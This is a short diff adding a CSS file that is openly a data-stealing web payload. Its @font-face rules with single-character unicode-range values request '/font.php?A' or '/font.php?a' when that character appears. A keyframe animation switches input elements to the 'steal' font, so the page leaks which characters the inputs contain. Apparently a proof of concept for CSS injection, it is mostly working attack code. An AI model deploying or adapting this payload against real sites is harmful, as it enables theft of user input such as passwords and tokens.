@@ -1,0 +1,33 @@
+@font-face {
+    src: url("/font.php?A");
+    unicode-range: U+0041;
+    font-family: steal-a-2;
+ }
+
+ @font-face {
+    src: url("/font.php?a");
+    unicode-range: U+0061;
+    font-family: steal-a-1;
+ }
+
+input {
+    position: absolute;
+    top: 5000px;
+    content-visibility: auto;
+    animation-duration: 1s;
+    animation-iteration-count: 1;
+    animation-fill-mode: forwards;
+    animation-name: detect;
+    background-color: black;
+
+}
+
+@keyframes detect {
+    from {
+        background-color: black;
+    }
+    to {
+        font-family: steal-a-1;
+        background-color: red;
+    }
+}
